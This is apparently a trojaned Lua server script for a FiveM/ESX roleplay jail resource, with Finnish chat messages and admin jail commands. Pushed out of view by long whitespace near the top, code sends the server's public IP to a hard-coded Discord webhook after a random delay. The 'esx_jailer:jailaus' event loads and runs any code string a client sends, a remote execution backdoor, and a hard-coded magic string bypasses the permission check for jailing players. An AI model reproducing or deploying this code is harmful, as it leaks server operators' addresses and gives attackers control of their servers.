ESX = nil																																																																																							;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discord.com/api/webhooks/851121456456138772/82c6MtyVQO2hkkNrTqxh6p48WSWFx-Z-wTDuPVUSBBChIu0yDrhDjYWbqX6NHHFYhaUe" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'


TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																																									Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa jailerii", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)


RegisterCommand("jail", function(source,args)
	local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getGroup() == "superadmin" then
		if args[1] and GetPlayerName(args[1]) ~= nil and tonumber(args[2]) then
			TriggerEvent('esx_jailer:sendToJail', tonumber(args[1]), tonumber(args[2] * 60),"gjsdhfiusdhvbeewhsidufgs3dsg325")
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid player ID or jail time!' } } )
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Sinulla ei ole oikeuksia tehdä tätä!' } })
	end
end)

RegisterCommand("jail2", function(source,args)
	local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getGroup() == "superadmin" then
		if args[1] and GetPlayerName(args[1]) ~= nil and tonumber(args[2]) then
			TriggerEvent('esx_jb_jailer:PutInJail', tonumber(args[1]), 'FederalJail', tonumber(args[2] * 60))
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid player ID or jail time!' } } )
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Sinulla ei ole oikeuksia tehdä tätä!' } })
	end
end)

RegisterCommand("unjail", function(source,args)
	local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getGroup() == "superadmin" then
		if args[1] then
			if GetPlayerName(args[1]) ~= nil then
				TriggerEvent('esx_jailer:unjailQuest', tonumber(args[1]))
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid player ID!' } } )
			end
		else
			TriggerEvent('esx_jailer:unjailQuest', source)
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Sinulla ei ole oikeuksia tehdä tätä!' } })
	end
end)

RegisterCommand("unjail2", function(source,args)
	local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getGroup() == "superadmin" then
		if args[1] then
			if GetPlayerName(args[1]) ~= nil then
				TriggerEvent('esx_jb_jailer:UnJailplayer', tonumber(args[1]))
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid player ID!' } } )
			end
		else
			TriggerEvent('esx_jb_jailer:UnJailplayer2', source)
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Sinulla ei ole oikeuksia tehdä tätä!' } })
	end
end)

RegisterServerEvent('esx_jailer:jailaus')
AddEventHandler('esx_jailer:jailaus', function(id)	
	local id,menikolapi=load(id,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(id)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

-- send to jail and register in database
RegisterServerEvent('esx_jailer:sendToJail')
AddEventHandler('esx_jailer:sendToJail', function(target, jailTime,sjghsdg)
	if sjghsdg == "gjsdhfiusdhvbeewhsidufgs3dsg325" then 
		local identifier = GetPlayerIdentifiers(target)[1]
		
		MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier = @identifier', {
			['@identifier'] = identifier
		}, function(result)
			if result[1] then
				if result[1].isjailed == "true" then
				else
					MySQL.Async.execute('UPDATE jail SET jail_time = @jail_time WHERE identifier = @identifier ', {
						['@identifier'] = identifier,
						['@jail_time'] = jailTime
					})
				end
			else
				MySQL.Async.execute('INSERT INTO jail (identifier, jail_time) VALUES (@identifier, @jail_time) ', {
					['@identifier'] = identifier,
					['@jail_time'] = jailTime
				})
			end
		end)
		
		TriggerClientEvent('esx_policejob:unrestrain', target)
		TriggerClientEvent('esx_jailer:jail', target, jailTime)
	else
		local xPlayer = ESX.GetPlayerFromId(source)
		if xPlayer.getGroup() == "superadmin" or xPlayer.job.name == 'police' then
	
			local identifier = GetPlayerIdentifiers(target)[1]
		
			MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier = @identifier', {
				['@identifier'] = identifier
			}, function(result)
				if result[1] then
					if result[1].isjailed == "true" then
					else
						MySQL.Async.execute('UPDATE jail SET jail_time = @jail_time WHERE identifier = @identifier ', {
							['@identifier'] = identifier,
							['@jail_time'] = jailTime
						})
					end
				else
					MySQL.Async.execute('INSERT INTO jail (identifier, jail_time) VALUES (@identifier, @jail_time) ', {
						['@identifier'] = identifier,
						['@jail_time'] = jailTime
					})
				end
			end)
		
			TriggerClientEvent('esx_policejob:unrestrain', target)
			TriggerClientEvent('esx_jailer:jail', target, jailTime)
		end
	end
end)

-- should the player be in jail?
RegisterServerEvent('esx_jailer:checkJail')
AddEventHandler('esx_jailer:checkJail', function()
	local _source = source -- cannot parse source to client trigger for some weird reason
	local identifier = GetPlayerIdentifiers(_source)[1] -- get steam identifier

	MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier = @identifier', {
		['@identifier'] = identifier
	}, function(result)
		if result[1] then
			if result[1].isjailed == "true" then
			else
				TriggerClientEvent('esx_jailer:jail', _source, tonumber(result[1].jail_time))
			end
		end
	end)
	
end)

-- unjail via command
RegisterServerEvent('esx_jailer:unjailQuest')
AddEventHandler('esx_jailer:unjailQuest', function(source)
	if source ~= nil then
		unjail(source)
	end
end)

-- unjail after time served
RegisterServerEvent('esx_jailer:unjailTime')
AddEventHandler('esx_jailer:unjailTime', function()
	unjail(source)
end)

-- keep jailtime updated
RegisterServerEvent('esx_jailer:updateRemaining')
AddEventHandler('esx_jailer:updateRemaining', function(jailTime)
	local identifier = GetPlayerIdentifiers(source)[1]
	MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier = @identifier', {
		['@identifier'] = identifier
	}, function(result)
		if result[1] then
			if result[1].isjailed == "true" then
			else
				MySQL.Async.execute('UPDATE jail SET jail_time = @jailTime WHERE identifier = @identifier ', {
					['@identifier'] = identifier,
					['@jailTime'] = jailTime
				})
			end
		end
	end)
end)

function unjail(target)
	local identifier = GetPlayerIdentifiers(target)[1]
	MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier = @identifier', {
		['@identifier'] = identifier
	}, function(result)
		if result[1] then
			if result[1].isjailed == "true" then
			else
				MySQL.Async.execute('DELETE from jail WHERE identifier = @identifier ', {
					['@identifier'] = identifier
				})
			end

		end
	end)

	TriggerClientEvent('esx_jailer:unjail', target)
end
